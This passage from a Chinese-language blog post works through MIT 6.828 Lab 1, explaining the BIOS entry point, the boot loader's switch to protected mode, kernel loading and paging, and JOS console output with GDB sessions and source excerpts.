的入口点</strong></p><p><img src="https://s2.loli.net/2022/03/15/G8adZYg3pk9lBRr.png" alt="image.png"></p><blockquote><p>为了原汁原味模拟 MIT 实验的感觉，笔者并未装上 pwn 手常用的 pwndbg 插件（其实只是懒 + 怕出现奇怪的问题）</p></blockquote><p>MIT 对这个启动过程总结出如下三点：</p><ul><li><p>IBM PC 启动时执行 0x000ffff0 处代码，这是为 ROM BIOS 保留的内存区域的顶部</p></li><li><p>PC 启动时 <code>CS = 0xf000</code>，<code>IP = 0xfff0</code></p></li><li><p>执行的第一条指令为跳转指令，跳转至<code>CS = 0xf000, IP = 0xe05b</code> 处</p></li></ul><p>为什么QEMU 的启动流程是这样的？这首先是 Intel 设计 8088 处理器的模式，之后被 IBM 用在了最初的 PC 上，这是因为在 PC 上， BIOS 被“硬连线”（hard-wired）到物理地址的 <code>0x0000f0000 - 0x000fffff</code> 处（物理地址起始 64KB），这个设计保证了 BIOS 在启动或是系统重启时总能是第一个拿到机器控制权的，因为此时 RAM 中还没有任何其他的软件可以让处理器运行（笔者认为这是一句废话）。QEMU 自己有着一个 BIOS，在处理器复位后，其处在实模式下，且会将 <code>CS:IP</code> 设置为 <code>0xf000:0xfff0</code>，因此 PC 从此处的代码开始执行——将 CS 寄存器左移 4 位再加上 IP 寄存器便获得了当前执行的代码的地址 <code>0xffff0</code>——20位的地址线撑起了 1MB 的内存空间。</p><blockquote><p>当笔者翻译完 MIT 实验页面的这一段话之后发现这完全没有任何意义——对于二进制人来说这是再基础不过的知识了，因此后面只会酌情引入 MIT 实验文档的翻译，更多的是笔者自己认为有必要写下的笔记，例如上面的这一段话的末尾部分便是笔者自己写的。</p></blockquote><p>接下来看 Exercise 2，主要是让我们尝试跟进调试一下 BIOS，感受一下他会做些什么：</p><blockquote><p>Exercise 2. Use GDB’s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at <a href="http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm">http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm</a>, as well as other materials on the <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">6.828 reference materials page</a>. No need to figure out all the details - just the general idea of what the BIOS is doing first.</p></blockquote><p>BIOS 主要完成的工作便是设置中断向量表（Interrupt Vector Table，位于 <code>0x000 ~ 0x3fff</code>），初始化一些设备（例如 VGA display），此时显存被映射到 <code>0xa0000 ~ 0xbffff</code>，显示适配器的 BIOS 被加载到 <code>0xc0000 ~ 0xc7fff</code>，此时<strong>我们直接向显存映射区写入内容便可以在屏幕上显示字符</strong></p><p>之后 BIOS 会读出硬盘上的<strong>第一个扇区</strong>到 <code>0x7c00</code> 处，<strong>并跳转到该处</strong>，我们称被载入的第一个扇区为<strong>主引导记录</strong>（Master Boot Record, aka MBR），其从 BIOS 手中接过启动 PC 的接力棒</p><blockquote><p>MIT 原实验文档中写的是 BIOS 将中断描述符表（Interrupt Descriptor Table）载入到内存当中，但笔者认为在<strong>实模式下应当为中断向量表</strong>，这是因为中断描述符是一个属于保护模式下的概念，这里做出改正</p></blockquote><h2 id="Part-2-The-Boot-Loader"><a href="#Part-2-The-Boot-Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>通常 PC 的硬盘与软盘上的空间被按照 <code>扇区</code> 进行划分，最常见的扇区大小为 <code>512B</code>，单个扇区也是我们读写磁盘最小的操作单位，若磁盘是可引导的，则第一个扇区称为<strong>引导扇区</strong>，因为该扇区中存放着 <em>引导加载程序</em> 的代码，BIOS 在 PC 启动后完成其工作后会将该扇区读到内存中的 <code>0x7c00 ~ 0x7fff</code> 处，之后使用一个 <code>jmp</code> 跳转指令跳转至 <code>CS:IP = 0000:7C00</code>，将控制权交给这一部分代码</p><blockquote><p>MIT 文档认为，这个地址是相当随意的，<strong>但经笔者考证这是一个有来头的地址</strong>，参见<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a></p></blockquote><p>由于 CD-ROM 的出现在 PC 发展史中较晚，这给了 PC 架构师足够的时间去重新思考并设计功能更加强大的引导方式，CD-ROM 通常使用 <code>2048B</code> 的扇区大小，且 BIOS 会将更多的扇区作为引导映像载入内存中，这部分内容可以参见<a href="https://pdos.csail.mit.edu/6.828/2018/readings/boot-cdrom.pdf">“El Torito” Bootable CD-ROM Format Specification</a></p><p>6.828 的 boot loader 包含两个文件：<code>boot/boot.S</code> 与 <code>boot/main.c</code>，其完成以下两个工作：</p><ul><li><p>将处理器<strong>从实模式切换到保护模式</strong>（boot.S）</p><ul><li><p>打开 A20-Gate 以支持大于 1MB 的地址空间</p></li><li><p>加载全局段描述符表</p></li><li><p>设置 cr0 寄存器对应标志位，进入保护模式</p></li></ul></li><li><p>通过 x86 的特殊 I&#x2F;O 指令从磁盘上读取内核并将之载入内存，跳转到内核（boot.c）</p><ul><li><p>通过 <code>in</code> 与 <code>out</code> 这两条指令读取磁盘数据</p></li><li><p>检查并分析 ELF header，跳转到内核</p></li></ul></li></ul><p>在大二下学习操作系统课程时笔者有幸尝试亲手写过一个内核（虽然远没有完成），其中就包括写 loader，因此这一部分笔者还是相对较为熟悉的，不过 MIT 代码的精炼程度远非笔者从 <em>另一本书上抄抄改改而来的代码</em> 所能比拟的，推荐大家仔细阅读（笑）</p><p>下面看 Exercise 3，主要是参照 6.828 的手册学习 GDB，这里就不贴过程了：</p><blockquote><p>Exercise 3. Take a look at the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>, especially the section on GDB commands. Even if you’re familiar with GDB, this includes some esoteric GDB commands that are useful for OS work.</p><p>Set a breakpoint at address 0x7c00, which is where the boot sector will be loaded. Continue execution until that breakpoint. Trace through the code in boot&#x2F;boot.S, using the source code and the disassembly file obj&#x2F;boot&#x2F;boot.asm to keep track of where you are. Also use the x&#x2F;i command in GDB to disassemble sequences of instructions in the boot loader, and compare the original boot loader source code with both the disassembly in obj&#x2F;boot&#x2F;boot.asm and GDB.</p><p>Trace into bootmain() in boot&#x2F;main.c, and then into readsect(). Identify the exact assembly instructions that correspond to each of the statements in readsect(). Trace through the rest of readsect() and back out into bootmain(), and identify the begin and end of the for loop that reads the remaining sectors of the kernel from the disk. Find out what code will run when the loop is finished, set a breakpoint there, and continue to that breakpoint. Then step through the remainder of the boot loader.</p></blockquote><p>6.828 还提供给我们一份反编译后的 loader 文件，位于 <code>obj/boot/boot.asm</code>，为上面两个文件编译后在内存中的样子，并附上了贴心的注释，推荐大家配合着这份文件进行调试，<strong>极致享受</strong>（笑）</p><p><img src="https://s2.loli.net/2022/02/20/pGUmRero8DqvH5j.png" alt="imagepng"></p><p>接下来解决一些 6.828 的习题：</p><ul><li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</p><ul><li><p>在 <code>boot.main.c</code> 中的 bootmain() 中通过 <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> 跳转到内核入口点</p></li><li><p>当 MBR 设置了 cr0 寄存器的 <code>PE</code> 标志位后，处理器从实模式进入到保护模式，对应的汇编代码为 <code>ljmp $0x8,$0x7c32</code>，<strong>这是在加载了全局段描述符表后使用代码段描述符完成的一个跳转指令</strong></p><p><img src="https://s2.loli.net/2022/02/20/bDBS7YIQpKEAlqJ.png" alt="imagepng"></p></li></ul></li><li><p>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded?</p><ul><li><p>boot loader 执行的最后一条指令为<code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code>，对应汇编代码 <code>call *0x10018</code>——这是 kernel 的入口点，而 kernel 执行的第一条指令为 <code>movw $0x1234, 0x472</code></p><p><img src="https://s2.loli.net/2022/02/20/DHyfhqPj7NgbsT6.png" alt="imagepng"></p></li></ul></li><li><p><em>Where</em> is the first instruction of the kernel?</p><ul><li>kernel 的第一条指令在其 ELF 入口点标注的位置，这里是 <code>0x10018</code></li></ul></li><li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</p><ul><li>loader 首先会从磁盘上读取前面一张页的内容（大小0x1000），在判断这是一个合法的 ELF header 之后解析其节表（其中包含每一节（section，也称段（segment））的相关信息，包括该段在文件内的偏移（p_offset）、在内存中的加载地址（p_vaddr）、在文件中的大小（p_filesz）、该段在内存中的大小（p_memsz）、该段的标志位（p_flags，主要标识 rwx 权限）），根据节表信息从磁盘上读取数据</li></ul></li></ul><h3 id="Loading-the-Kernel"><a href="#Loading-the-Kernel" class="headerlink" title="Loading the Kernel"></a>Loading the Kernel</h3><p>首先看 Exercise 4，主要是<strong>复习</strong>你的 C 语言知识，尤其是关于指针的那一部分（笑），这一块可以参考大名鼎鼎的 K&amp;R C，以及装载链接ELF文件等基础知识，笔者推荐阅读《程序员的自我修养》</p><blockquote><p>Exercise 4. Read about programming with pointers in C. The best reference for the C language is <em>The C Programming Language</em> by Brian Kernighan and Dennis Ritchie (known as ‘K&amp;R’). We recommend that students purchase this book (here is an <a href="http://www.amazon.com/C-Programming-Language-2nd/dp/0131103628/sr=8-1/qid=1157812738/ref=pd_bbs_1/104-1502762-1803102?ie=UTF8&s=books">Amazon Link</a>) or find one of <a href="http://library.mit.edu/F/AI9Y4SJ2L5ELEE2TAQUAAR44XV5RTTQHE47P9MKP5GQDLR9A8X-10422?func=item-global&doc_library=MIT01&doc_number=000355242&year=&volume=&sub_library=">MIT’s 7 copies</a>.</p><p>Read 5.1 (Pointers and Addresses) through 5.5 (Character Pointers and Functions) in K&amp;R. Then download the code for <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/pointers.c">pointers.c</a>, run it, and make sure you understand where all of the printed values come from. In particular, make sure you understand where the pointer addresses in printed lines 1 and 6 come from, how all the values in printed lines 2 through 4 get there, and why the values printed in line 5 are seemingly corrupted.</p><p>There are other references on pointers in C (e.g., <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pointers.pdf">A tutorial by Ted Jensen</a> that cites K&amp;R heavily), though not as strongly recommended.</p><p><em>Warning:</em> Unless you are already thoroughly versed in C, do not skip or even skim this reading exercise. If you do not really understand pointers in C, you will suffer untold pain and misery in subsequent labs, and then eventually come to understand them the hard way. Trust us; you don’t want to find out what “the hard way” is.</p></blockquote><p>接下来是 Exercise 5，主要是改 Makefile 文件中指定的链接地址然后重新调试体验一下，这里就跳过了</p><blockquote><p>Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would “break” or otherwise do the wrong thing if you were to get the boot loader’s link address wrong. Then change the link address in boot&#x2F;Makefrag to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Don’t forget to change the link address back and make clean again afterward!</p></blockquote><p>最后是 Exercise 6，使用 GDB 指令在 BIOS 将控制权交给 MBR 时查看内存 <code>0x00100000</code> 处的数据</p><blockquote><p>Exercise 6. We can examine memory using GDB’s x command. The <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html">GDB manual</a> has full details, but for now, it is enough to know that the command x&#x2F;<em>N</em>x <em>ADDR</em> prints <em>N</em> words of memory at <em>ADDR</em>. (Note that both ‘x’s in the command are lowercase.) <em>Warning</em>: The size of a word is not a universal standard. In GNU assembly, a word is two bytes (the ‘w’ in xorw, which stands for word, means 2 bytes).</p><p>Reset the machine (exit QEMU&#x2F;GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.)</p></blockquote><p>虽然要求只看 8 个 word，但是笔者还是习惯多看一些（笑），这里可以看到在刚刚运行到 MBR 时该处数据都是0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">The target architecture is set to &quot;i8086&quot;.</span><br><span class="line">[f000:fff0]    0xffff0:    ljmp   $0xf000,$0xe05b</span><br><span class="line">0x0000fff0 in ?? ()</span><br><span class="line">+ symbol-file obj/kern/kernel</span><br><span class="line">(gdb) x /20gx 0x00100000 </span><br><span class="line">0x100000:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100010:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100020:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100030:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100040:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100050:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100060:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100070:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100080:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100090:    0x0000000000000000    0x0000000000000000</span><br><span class="line">(gdb) b *0x7c00</span><br><span class="line">Breakpoint 1 at 0x7c00</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[   0:7c00] =&gt; 0x7c00:    cli    </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007c00 in ?? ()</span><br><span class="line">(gdb) x /20gx 0x00100000 </span><br><span class="line">0x100000:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100010:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100020:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100030:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100040:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100050:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100060:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100070:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100080:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100090:    0x0000000000000000    0x0000000000000000</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>接下来在进入内核时再次查看此处数据，发现已经被覆盖上了新的数据，主要是内核的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x00007d81 in ?? ()</span><br><span class="line">(gdb) x /20gx 0x00100000 </span><br><span class="line">0x100000:    0x000000001badb002    0x7205c766e4524ffe</span><br><span class="line">0x100010:    0x2000b81234000004    0xc0200fd8220f0011</span><br><span class="line">0x100020:    0xc0220f800100010d    0xbde0fff010002fb8</span><br><span class="line">0x100030:    0x110000bc00000000    0xfeeb0000006ce8f0</span><br><span class="line">0x100040:    0x56e58955fb1e0ff3    0xc3810000017ee853</span><br><span class="line">0x100050:    0x8308758b000112ba    0xff0778838d5608ec</span><br><span class="line">0x100060:    0x8300000a03e850ff    0xec83297ef68510c4</span><br><span class="line">0x100070:    0xffc6e850ff468d0c    0x08ec8310c483ffff</span><br><span class="line">0x100080:    0x50ffff0794838d56    0x10c483000009dde8</span><br><span class="line">0x100090:    0x83c35d5e5bf8658d    0x006a006a006a04ec</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>这里我们注意到一个数字<code>0x1badb002</code>——<strong>这是 Multiboot Specification 标准要求的一个位于 header 的 magic number</strong>，在启动时会校验这个数，详情可以参见 <a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">https://www.gnu.org/software/grub/manual/multiboot/multiboot.html</a></p><h2 id="Part-3-The-Kernel"><a href="#Part-3-The-Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><p>在本部分中我们将开始学习 JOS 的最小实现的细节，并<strong>开始写一些代码</strong>。如同 boot loader 一般，内核在一开始也先执行一些汇编代码，以让 C 代码能恰当地执行</p><h3 id="Using-virtual-memory-to-work-around-position-dependence"><a href="#Using-virtual-memory-to-work-around-position-dependence" class="headerlink" title="Using virtual memory to work around position dependence"></a>Using virtual memory to work around position dependence</h3><p>MBR 的链接地址于加载地址完全匹配，因为其运行在实模式下，<del>他的一切都很真！实模式主打的就是真实！</del>，但内核的加载地址与链接地址却存在<strong>相当大的差别，OS 更倾向于被链接到一个更高的虚拟地址上运行，但其实际则位于物理低地址</strong></p><p>接下来我们使用 <code>objdump</code> 查看编译出的内核 ELF 文件来验证这个结论，结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -h ./obj/kern/kernel</span></span><br><span class="line"></span><br><span class="line">./obj/kern/kernel:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">  0 .text         00001a7f  f0100000  00100000  00001000  2**4</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  1 .rodata       000006bc  f0101a80  00101a80  00002a80  2**5</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  2 .stab         00004219  f010213c  0010213c  0000313c  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  3 .stabstr      0000198a  f0106355  00106355  00007355  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  4 .data         00009300  f0108000  00108000  00009000  2**12</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  5 .got          00000008  f0111300  00111300  00012300  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  6 .got.plt      0000000c  f0111308  00111308  00012308  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  7 .data.rel.local 00001000  f0112000  00112000  00013000  2**12</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  8 .data.rel.ro.local 00000044  f0113000  00113000  00014000  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  9 .bss          00000648  f0113060  00113060  00014060  2**5</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 10 .comment      00000023  00000000  00000000  000146a8  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br></pre></td></tr></table></figure><p>VMA 为虚拟地址，LMA 为加载地址，可见确实如此。这是因为当 OS kernel 被运行在较高的虚拟地址时，其可以很方便地将虚拟地址空间的低地址部分留给用户程序使用，<strong>但通常大部分 32 位机器并没有足够大的内存，他们在 0xf0100000 处往往没有任何物理内存</strong>，因此我们需要实现<strong>虚拟地址到物理地址的映射</strong>，这需要借助页表的帮助。</p><p>在设置 cr0 寄存器的 <code>PG</code> 标志位前，我们的内存管理模式是<strong>分段</strong>模式，此时我们对内存的访问使用的是<strong>线性地址</strong>（linear address）——由段选择子与段描述符表来描述分段，完成线性地址到物理地址的映射；在设置了 cr0 寄存器的 <code>PG</code> 标志位之后，我们对内存访问使用的就是<strong>虚拟地址</strong>（virtual）——由页表描述虚拟地址空间到物理地址空间的映射，并由 MMU 完成翻译</p><p>32位下最常用的是二级页表，6.828 十分贴心地在 <code>kern/entrypgdir.c</code> 中手写了一个静态初始化的页表结构，设置了虚拟地址 <code>0xf0000000 ~ 0xf0400000</code> 到物理地址 <code>0x00000000 ~ 0x00400000</code> 映射，以及虚拟地址 <code>0x00000000 ~ 0x00400000</code> 到物理地址 <code>0x00000000 ~ 0x00400000</code> 映射。</p><p>若我们尝试访问不属于这两个地址范围的地址，则会触发缺页中断，由于我们尚未设置对应的中断处理程序，因此会导致 QEMU crash 并退出</p><p>接下来是 Exercise 7，查看分页机制开启前后 <code>0x00100000</code> 与 <code>0xf0100000</code> 这两个地址上的数据</p><blockquote><p>Exercise 7. Use QEMU and GDB to trace into the JOS kernel and stop at the <code>movl %eax, %cr0</code>. Examine memory at 0x00100000 and at 0xf0100000. Now, single step over that instruction using the stepi GDB command. Again, examine memory at 0x00100000 and at 0xf0100000. Make sure you understand what just happened.</p><p>What is the first instruction <em>after</em> the new mapping is established that would fail to work properly if the mapping weren’t in place? Comment out the <code>movl %eax, %cr0</code> in kern&#x2F;entry.S, trace into it, and see if you were right.</p></blockquote><p>结果如下，在成功建立页表映射之后这两个地址的数据是一致的，因为<strong>完成映射后这两个虚拟地址空间指向同一物理地址空间</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) </span><br><span class="line">=&gt; 0x10001d:    mov    %cr0,%eax</span><br><span class="line">0x0010001d in ?? ()</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0x100020:    or     $0x80010001,%eax</span><br><span class="line">0x00100020 in ?? ()</span><br><span class="line">(gdb) x /8x 0x00100000</span><br><span class="line">0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766</span><br><span class="line">0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8</span><br><span class="line">(gdb) x /8x 0xf0100000</span><br><span class="line">0xf0100000 &lt;_start-268435468&gt;:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0xf0100010 &lt;entry+4&gt;:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0x100025:    mov    %eax,%cr0</span><br><span class="line">0x00100025 in ?? ()</span><br><span class="line">(gdb) </span><br><span class="line">=&gt; 0x100028:    mov    $0xf010002f,%eax</span><br><span class="line">0x00100028 in ?? ()</span><br><span class="line">(gdb) x /8x 0x00100000</span><br><span class="line">0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766</span><br><span class="line">0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8</span><br><span class="line">(gdb) x /8x 0xf0100000</span><br><span class="line">0xf0100000 &lt;_start-268435468&gt;:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766</span><br><span class="line">0xf0100010 &lt;entry+4&gt;:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><h3 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h3><p>这部分要求我们阅读 <code>kern/printf.c, lib/printfmt.c, kern/console.c</code> 以了解 xv6 向控制台输出字符的实现。在正式开始阅读代码之前，我们先自行思考一下：如何在一块 80 * 24 的屏幕上实现各种各样的输出功能？</p><p>我们不难想到，所有的输出操作最终都可以通过使用一个“输出原语”实现——「输出单个字符」，我们在实现其他的输出功能，例如 printf 或是 puts 时，只需要在这些函数内部多次调用这个输出原语即可。</p><p>这个输出原语应当完成如下功能：</p><ul><li><p>在屏幕光标处输出字符，并适当移动光标（例如普通字符则将光标向后移动一个字符，而 <code>\b</code> 则将光标向前移动一个字符， <code>\n</code> 则将光标移到下一行）</p></li><li><p>控制输出字符的颜色</p></li><li><p>完成基础的换行功能，当屏幕被字符填充满时进行滚屏</p></li></ul><p>前面我们讲到，在 BIOS 时期<strong>有一部分显存被映射到内存当中，其实我们只需要直接往显存上写入数据即可控制屏幕输出</strong>，因此最终涉及到与显卡交互的其实只有光标</p><p><code>0xB800~0xBFFF</code> 这块区域是供文本模式使用的显存，当我们在显存内的相应位置写入数据时，屏幕上就会出现对应的字符，在文本模式下显示器支持 <code>80 x 25</code> 16 色文本显示的窗口，一个字符占用两个字节：<strong>第一个字节为 ASCII 码，第二个字节为颜色信息</strong></p><p>现在我们来看 xv6 的源码，其使用一个 <code>cons_putc()</code> 函数实现了这个字符输出原语，定义于 <code>kern/console.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// output a character to the console</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">cons_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    serial_putc(c);</span><br><span class="line">    lpt_putc(c);</span><br><span class="line">    cga_putc(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到其最终调用三个函数：<code>serial_putc()</code>、<code>lpt_putc()</code>、<code>cga_putc()</code>，咋一看有些一头雾水，看函数名后缀似乎这三个函数都是用来输出单个字符的？</p><p>先看第一个函数 <code>serial_putc()</code>，其中调用了 <code>inb()</code> 和 <code>outb()</code> 两个函数，这是两个封装好的用以操作端口的函数，展开以后其实就是内联汇编写的 <code>inb</code> 和 <code>outb</code> 指令，单位都是字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COM_TX        0    <span class="comment">// Out: Transmit buffer (DLAB=0)</span></span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COM_LSR        5    <span class="comment">// In:    Line Status Register</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>   COM_LSR_DATA    0x01    <span class="comment">//   Data available</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>   COM_LSR_TXRDY    0x20    <span class="comment">//   Transmit buffer avail</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>   COM_LSR_TSRE    0x40    <span class="comment">//   Transmitter off</span></span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">serial_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;</span><br><span class="line">         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="number">12800</span>;</span><br><span class="line">         i++)</span><br><span class="line">        delay();</span><br><span class="line"></span><br><span class="line">    outb(COM1 + COM_TX, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inc/x86.h</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint8_t</span></span><br><span class="line"><span class="title function_">inb</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> data;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;inb %w1,%0&quot;</span> : <span 